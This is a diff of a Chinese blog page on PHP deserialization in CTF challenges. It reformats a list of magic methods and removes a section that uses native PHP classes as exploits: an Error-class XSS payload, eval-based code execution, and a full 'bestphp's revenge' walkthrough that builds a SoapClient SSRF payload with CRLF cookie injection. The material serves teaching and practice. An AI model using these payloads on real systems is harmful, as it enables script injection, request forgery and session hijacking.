@@ -81,13 +81,13 @@
           ·
         </span>
         <span>
-          5060 words
+          3894 words
         </span>
         <span class="split">
           ·
         </span>
         <span>
-          11 minute read
+          8 minute read
         </span>
     </div>
 
@@ -102,16 +102,24 @@
 
     <div class="content">
       <p><strong>魔术方法</strong></p>
-<p>__construct() //当一个对象创建时被调用</p>
-<p>__destruct() //当一个对象销毁时被调用</p>
-<p>__toString() //当一个对象被当作一个字符串使用</p>
-<p>__sleep()//在对象在被序列化之前运行</p>
-<p>__wakeup() //将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)</p>
-<p>__get() //获得一个类的成员变量时调用</p>
-<p>__set() //在尝试给对象的不可访问（如私有或未定义）属性赋值时被自动调用</p>
-<p>__invoke() //调用函数的方式调用一个对象时的回应方法</p>
-<p>__call() //当调用一个对象中的不能用的方法的时候就会执行这个函数</p>
-<p><strong>反序列化漏洞条件</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>__construct() <span style="color:#080;font-style:italic">//当一个对象创建时被调用
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>
+</span></span><span style="display:flex;"><span>__destruct() <span style="color:#080;font-style:italic">//当一个对象销毁时被调用
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>
+</span></span><span style="display:flex;"><span>__toString() <span style="color:#080;font-style:italic">//当一个对象被当作一个字符串使用
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>
+</span></span><span style="display:flex;"><span>__sleep()<span style="color:#080;font-style:italic">//在对象在被序列化之前运行
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>
+</span></span><span style="display:flex;"><span>__wakeup() <span style="color:#080;font-style:italic">//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>
+</span></span><span style="display:flex;"><span>__get() <span style="color:#080;font-style:italic">//获得一个类的成员变量时调用
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>
+</span></span><span style="display:flex;"><span>__set() <span style="color:#080;font-style:italic">//在尝试给对象的不可访问（如私有或未定义）属性赋值时被自动调用
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>
+</span></span><span style="display:flex;"><span>__invoke() <span style="color:#080;font-style:italic">//调用函数的方式调用一个对象时的回应方法
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>
+</span></span><span style="display:flex;"><span>__call() <span style="color:#080;font-style:italic">//当调用一个对象中的不能用的方法的时候就会执行这个函数
+</span></span></span></code></pre></div><p><strong>反序列化漏洞条件</strong>：</p>
 <ol>
 <li>
 <p>代码中有可利用的类，类中有可用的魔术方法</p>
@@ -683,146 +691,6 @@
 <p>最后传参时加上attr=succcess.txt就可以拿到flag啦~~</p>
 <p><p class="markdown-image">
   <img src="/img/48.png" alt="alt text"  />
-</p></p>
-<p><strong>PHP原生类序列化</strong></p>
-<p>下面简单介绍ctf中常见原生类及部分类用法：</p>
-<blockquote>
-<p>Error/Exception类</p>
-</blockquote>
-<blockquote>
-<p>SoapClient类</p>
-</blockquote>
-<blockquote>
-<p>DirectoryIterator/FilesystemIterator类</p>
-</blockquote>
-<blockquote>
-<p>SplFileObject类</p>
-</blockquote>
-<blockquote>
-<p>SimpleXMLElement</p>
-</blockquote>
-<blockquote>
-<p>ZipArchive类</p>
-</blockquote>
-<ol>
-<li>Error/Exception类的利用</li>
-</ol>
-<ul>
-<li>Error XSS:</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;?</span>php  
-</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">echo</span> unserialize(<span style="color:#b8860b">$_GET</span>[<span style="color:#b44">&#39;cmd&#39;</span>]);  
-</span></span><span style="display:flex;"><span><span style="color:#080">?&gt;</span><span style="">
-</span></span></span></code></pre></div><p>使用Error类可以用来弹xss:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;?</span>php
-</span></span><span style="display:flex;"><span><span style="color:#b8860b">$a</span><span style="color:#666">=</span><span style="color:#a2f;font-weight:bold">new</span> Error(<span style="color:#b44">&#34;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&#34;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">echo</span> urlencode(serialize(<span style="color:#b8860b">$a</span>));
-</span></span><span style="display:flex;"><span><span style="color:#080">?&gt;</span><span style="">
-</span></span></span></code></pre></div><p>得到:</p>
-<blockquote>
-<p>O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A29%3A%22D%3A%5Cphpstudy_pro%5CWWW%5Cerror.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</p>
-</blockquote>
-<p>将以上字符串赋给cmd就可以看到弹框：</p>
-<p><p class="markdown-image">
-  <img src="/img/39.png" alt="alt text"  />
-</p></p>
-<ul>
-<li>Error 命令执行</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;?</span>php
-</span></span><span style="display:flex;"><span><span style="color:#b8860b">$a</span> <span style="color:#666">=</span> <span style="color:#b8860b">$_GET</span>[<span style="color:#b44">&#39;a&#39;</span>];
-</span></span><span style="display:flex;"><span><span style="color:#b8860b">$b</span> <span style="color:#666">=</span> <span style="color:#b8860b">$_GET</span>[<span style="color:#b44">&#39;b&#39;</span>];
-</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">eval</span>(<span style="color:#b44">&#34;echo new </span><span style="color:#b68;font-weight:bold">$a</span><span style="color:#b44">(</span><span style="color:#b68;font-weight:bold">$b</span><span style="color:#b44">());&#34;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#080">?&gt;</span><span style="">
-</span></span></span></code></pre></div><p>此时通过传<code>?a=Error&amp;b=phpinfo</code>就可以执行命令</p>
-<p><p class="markdown-image">
-  <img src="/img/40.png" alt="alt text"  />
-</p></p>
-<ol start="2">
-<li>SoapClient类的使用</li>
-</ol>
-<p>SOAP 是一种简单的基于 XML 的协议，它使应用程序通过 HTTP 来交换信息。php中的soapClient类可以创建soap数据报文，与wsdl接口进行交互,而WSDL文件是描述SOAP服务的接口。</p>
-<p>SoapClient类的构造函数如下：</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">public</span> SoapClient <span style="color:#666">::</span> <span style="color:#b44">SoapClient</span> （mixed <span style="color:#b8860b">$wsdl</span> [，array <span style="color:#b8860b">$options</span> ]）
-</span></span></code></pre></div><p>第一个参数是用来指明是否是wsdl模式。</p>
-<p>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</p>
-<p>示例：</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#b8860b">$a</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> SoapClient(<span style="color:#a2f;font-weight:bold">null</span>,<span style="color:#a2f;font-weight:bold">array</span>(<span style="color:#b44">&#39;location&#39;</span><span style="color:#666">=&gt;</span><span style="color:#b44">&#34;http://127.0.0.1/flag.php&#34;</span>,<span style="color:#b44">&#39;uri&#39;</span><span style="color:#666">=&gt;</span><span style="color:#b44">&#34;123&#34;</span>));
-</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">echo</span> urlencode(serialize(<span style="color:#b8860b">$a</span>));
-</span></span></code></pre></div><p><strong>bestphp‘revenge</strong></p>
-<p>知识点：</p>
-<ol>
-<li>
-<p>session反序列化</p>
-</li>
-<li>
-<p>原生类SoapClient的SSRF</p>
-</li>
-<li>
-<p>extract()变量覆盖</p>
-</li>
-<li>
-<p>CRLF</p>
-</li>
-</ol>
-<p>题目打开看到源码如下：</p>
-<p><p class="markdown-image">
-  <img src="/img/49.png" alt="alt text"  />
-</p></p>
-<p>dirsearch扫描发现flag.php</p>
-<p><p class="markdown-image">
-  <img src="/img/50.png" alt="alt text"  />
-</p></p>
-<p>于是访问：</p>
-<p><p class="markdown-image">
-  <img src="/img/51.png" alt="alt text"  />
-</p></p>
-<p>提示要localhost，暗示ssrf,又有session,说明要用到session反序列化，利用php原生类实现ssrf。</p>
-<p>现在来分析一下题目源码：</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;?</span>php
-</span></span><span style="display:flex;"><span>highlight_file(<span style="color:#800">__FILE__</span>);
-</span></span><span style="display:flex;"><span><span style="color:#b8860b">$b</span> <span style="color:#666">=</span> <span style="color:#b44">&#39;implode&#39;</span>;
-</span></span><span style="display:flex;"><span>call_user_func(<span style="color:#b8860b">$_GET</span>[<span style="color:#b44">&#39;f&#39;</span>], <span style="color:#b8860b">$_POST</span>);
-</span></span><span style="display:flex;"><span>session_start();
-</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">if</span> (isset(<span style="color:#b8860b">$_GET</span>[<span style="color:#b44">&#39;name&#39;</span>])) {
-</span></span><span style="display:flex;"><span>    <span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#39;name&#39;</span>] <span style="color:#666">=</span> <span style="color:#b8860b">$_GET</span>[<span style="color:#b44">&#39;name&#39;</span>];
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>var_dump(<span style="color:#b8860b">$_SESSION</span>);
-</span></span><span style="display:flex;"><span><span style="color:#b8860b">$a</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">array</span>(reset(<span style="color:#b8860b">$_SESSION</span>), <span style="color:#b44">&#39;welcome_to_the_lctf2018&#39;</span>);
-</span></span><span style="display:flex;"><span>call_user_func(<span style="color:#b8860b">$b</span>, <span style="color:#b8860b">$a</span>);
-</span></span><span style="display:flex;"><span><span style="color:#080">?&gt;</span><span style="">
-</span></span></span></code></pre></div><p>思路：</p>
-<ol>
-<li>
-<p>$b虽然已经给了初值，但能利用这行<code>call_user_func($_GET['f'], $_POST);</code>实现值覆盖。</p>
-</li>
-<li>
-<p>利用session_start()指定php_serialize做序列化引擎，因为反序列化默认引擎是php,将ssrf序列化内容前加<code>|</code>后通过name就可以存储我们构造的session。</p>
-</li>
-<li>
-<p>再看到这行<code>call_user_func($b, $a);</code>想到可以让$b覆盖为<code>call_user_func</code>,此时就变成<code>call_user_func(call_user_func,array($_session,‘welcome_to_the_lctf2018’));</code>,$session这个对象会去调用<code>welcome_to_the_lctf2018</code>这个不存在方法,触发call，服务器就会携带我们设置的cookie去访问flag.php。</p>
-</li>
-</ol>
-<p>构造ssrf内容:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;?</span>php
-</span></span><span style="display:flex;"><span><span style="color:#b8860b">$target</span> <span style="color:#666">=</span> <span style="color:#b44">&#39;http://127.0.0.1/flag.php&#39;</span>;
-</span></span><span style="display:flex;"><span><span style="color:#b8860b">$b</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> SoapClient(<span style="color:#a2f;font-weight:bold">null</span>,<span style="color:#a2f;font-weight:bold">array</span>(<span style="color:#b44">&#39;location&#39;</span><span style="color:#666">=&gt;</span><span style="color:#b8860b">$target</span>,
-</span></span><span style="display:flex;"><span>   	 <span style="color:#b44">&#39;user_agent&#39;</span><span style="color:#666">=&gt;</span><span style="color:#b44">&#34;npfs</span><span style="color:#b62;font-weight:bold">\r\n</span><span style="color:#b44">Cookie:PHPSESSID=123456</span><span style="color:#b62;font-weight:bold">\r\n</span><span style="color:#b44">&#34;</span>,
-</span></span><span style="display:flex;"><span>   	 <span style="color:#b44">&#39;uri&#39;</span><span style="color:#666">=&gt;</span><span style="color:#b44">&#34;http://127.0.0.1/&#34;</span>));
-</span></span><span style="display:flex;"><span><span style="color:#b8860b">$se</span> <span style="color:#666">=</span> serialize(<span style="color:#b8860b">$b</span>);
-</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">echo</span> <span style="color:#b44">&#34;|&#34;</span> <span style="color:#666">.</span> urlencode(<span style="color:#b8860b">$se</span>);
-</span></span><span style="display:flex;"><span><span style="color:#080">?&gt;</span><span style="">
-</span></span></span></code></pre></div><p>浏览器打开得到如下字符串：</p>
-<blockquote>
-<p>|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A31%3A%22npfs%0D%0ACookie%3APHPSESSID%3D123456%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</p>
-</blockquote>
-<p>指定序列化引擎：</p>
-<p><p class="markdown-image">
-  <img src="/img/52.png" alt="alt text"  />
-</p></p>
-<p>利用extract函数覆盖b的值并修改cookie即可：</p>
-<p><p class="markdown-image">
-  <img src="/img/53.png" alt="alt text"  />
 </p></p>
     </div>
 
